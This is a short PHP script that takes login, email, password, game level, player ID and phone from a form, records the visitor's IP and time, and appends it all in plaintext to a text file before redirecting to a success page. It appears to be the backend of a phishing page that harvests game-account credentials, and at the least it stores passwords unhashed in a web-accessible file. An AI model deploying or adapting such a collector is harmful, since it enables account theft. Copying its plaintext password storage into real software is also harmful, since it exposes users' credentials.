<?php
$login = $_POST['login'];
$email = $_POST['email'];
$password = $_POST['password'];
$level = $_POST['level'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$ipAddress = $_SERVER['REMOTE_ADDR'];
$loginTime = date('Y-m-d H:i:s');

// Store the data in a file
$data = "Login: $login\nEmail: $email\nPassword: $password\nLevel: $level\nPlayID: $playid\nPhone: $phone\nIP Address: $ipAddress\nLogin Time: $loginTime\n\n";
$file = 'data.txt';
file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

// You can also store the data in a database instead of a file

// Redirect the user to a success page or display a success message
header('Location: success.html');
exit();
?>
